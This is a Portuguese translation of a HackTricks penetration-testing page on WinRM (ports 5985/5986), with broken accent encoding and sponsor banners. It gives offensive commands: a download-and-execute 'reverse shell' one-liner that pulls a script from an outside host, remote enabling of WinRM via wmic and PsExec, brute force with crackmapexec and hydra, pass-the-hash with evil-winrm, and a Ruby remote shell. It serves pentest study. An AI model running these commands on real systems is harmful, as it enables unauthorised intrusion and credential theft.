# 5985,5986 - Teste de Penetra√ß√£o WinRM

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Percep√ß√µes de Hacking**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e percep√ß√µes em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais recentes programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) √© destacado como um **protocolo da Microsoft** que permite a **gest√£o remota de sistemas Windows** atrav√©s de HTTP(S), aproveitando o SOAP no processo. √â fundamentalmente alimentado pelo WMI, apresentando-se como uma interface baseada em HTTP para opera√ß√µes WMI.

A presen√ßa do WinRM em uma m√°quina permite uma administra√ß√£o remota direta via PowerShell, semelhante ao funcionamento do SSH para outros sistemas operacionais. Para determinar se o WinRM est√° operacional, √© recomendado verificar a abertura de portas espec√≠ficas:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Uma porta aberta da lista acima significa que o WinRM foi configurado, permitindo assim tentativas de iniciar uma sess√£o remota.

### **Iniciando uma Sess√£o WinRM**

Para configurar o PowerShell para o WinRM, o cmdlet `Enable-PSRemoting` da Microsoft entra em a√ß√£o, configurando o computador para aceitar comandos remotos do PowerShell. Com acesso elevado ao PowerShell, os seguintes comandos podem ser executados para habilitar essa funcionalidade e designar qualquer host como confi√°vel:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Este m√©todo envolve adicionar um caractere curinga √† configura√ß√£o `trustedhosts`, um passo que requer considera√ß√£o cautelosa devido √†s suas implica√ß√µes. Tamb√©m √© observado que pode ser necess√°rio alterar o tipo de rede de "P√∫blica" para "Trabalho" na m√°quina do atacante.

Al√©m disso, o WinRM pode ser **ativado remotamente** usando o comando `wmic`, demonstrado da seguinte forma:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Este m√©todo permite a configura√ß√£o remota do WinRM, aumentando a flexibilidade na gest√£o de m√°quinas Windows √† dist√¢ncia.

### Testar se configurado

Para verificar a configura√ß√£o da sua m√°quina de ataque, o comando `Test-WSMan` √© utilizado para verificar se o alvo possui o WinRM configurado corretamente. Ao executar este comando, voc√™ deve esperar receber detalhes sobre a vers√£o do protocolo e wsmid, indicando uma configura√ß√£o bem-sucedida. Abaixo est√£o exemplos que demonstram a sa√≠da esperada para um alvo configurado versus um n√£o configurado:

* Para um alvo que est√° configurado corretamente, a sa√≠da ser√° semelhante a esta:
```bash
Test-WSMan <target-ip>
```
A resposta deve conter informa√ß√µes sobre a vers√£o do protocolo e wsmid, significando que o WinRM est√° configurado corretamente.

![](<../.gitbook/assets/image (582).png>)

* Por outro lado, para um alvo **n√£o** configurado para WinRM, o resultado n√£o apresentar√° informa√ß√µes detalhadas, destacando a aus√™ncia de uma configura√ß√£o adequada do WinRM.

![](<../.gitbook/assets/image (458).png>)

### Executar um comando

Para executar `ipconfig` remotamente em uma m√°quina alvo e visualizar sua sa√≠da, fa√ßa:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (151).png>)

Voc√™ tamb√©m pode **executar um comando do seu console PS atual via** _**Invoke-Command**_. Suponha que voc√™ tenha localmente uma fun√ß√£o chamada _**enumeration**_ e queira **execut√°-la em um computador remoto**, voc√™ pode fazer:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Executar um Script
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Obter shell reverso
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Obter uma sess√£o PS

Para obter um shell interativo do PowerShell, use `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (1009).png>)

**A sess√£o ser√° executada em um novo processo (wsmprovhost) dentro do "alvo"**

### **For√ßando a Abertura do WinRM**

Para usar a Remo√ß√£o do PS e o WinRM, mas o computador n√£o est√° configurado, voc√™ pode habilit√°-lo com:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Salvando e Restaurando sess√µes

Isso **n√£o funcionar√°** se a **linguagem** estiver **restrita** no computador remoto.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Dentro destas sess√µes, voc√™ pode carregar scripts do PS usando _Invoke-Command_.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Erros

Se encontrar o seguinte erro:

`enter-pssession : A conex√£o com o servidor remoto 10.10.10.175 falhou com a seguinte mensagem de erro: O cliente WinRM n√£o pode processar a solicita√ß√£o. Se o esquema de autentica√ß√£o for diferente do Kerberos, ou se o computador cliente n√£o estiver associado a um dom√≠nio, ent√£o o transporte HTTPS deve ser usado ou a m√°quina de destino deve ser adicionada √† configura√ß√£o TrustedHosts. Use winrm.cmd para configurar TrustedHosts. Observe que os computadores na lista TrustedHosts podem n√£o ser autenticados. Voc√™ pode obter mais informa√ß√µes sobre isso executando o seguinte comando: winrm help config. Para obter mais informa√ß√µes, consulte o t√≥pico de Ajuda sobre Solu√ß√£o de Problemas Remotos.`

A tentativa no cliente (informa√ß√µes de [aqui](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicar com hackers experientes e ca√ßadores de bugs!

**Percep√ß√µes de Hacking**\
Envolver-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais recentes lan√ßamentos de recompensas por bugs e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## Conex√£o WinRM no Linux

### For√ßa Bruta

Tenha cuidado, for√ßar a entrada no winrm pode bloquear usu√°rios.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Usando o evil-winrm
```ruby
gem install evil-winrm
```
Leia a **documenta√ß√£o** em seu github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Para usar o evil-winrm para se conectar a um **endere√ßo IPv6**, crie uma entrada dentro de _**/etc/hosts**_ definindo um **nome de dom√≠nio** para o endere√ßo IPv6 e conecte-se a esse dom√≠nio.

### Passando o hash com evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (680).png>)

### Usando uma m√°quina PS-docker
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Usando um script ruby

**C√≥digo extra√≠do daqui:** [**https://alamot.github.io/winrm\_shell/**](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## Refer√™ncias

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## Comandos Autom√°ticos do HackTricks
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‚ÄòMySuperSecr3tPass123!‚Äô

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
‚Äã

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Percep√ß√µes de Hacking**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e percep√ß√µes em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais recentes lan√ßamentos de recompensas por bugs e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

<details>

<summary><strong>Aprenda hacking AWS de zero a her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
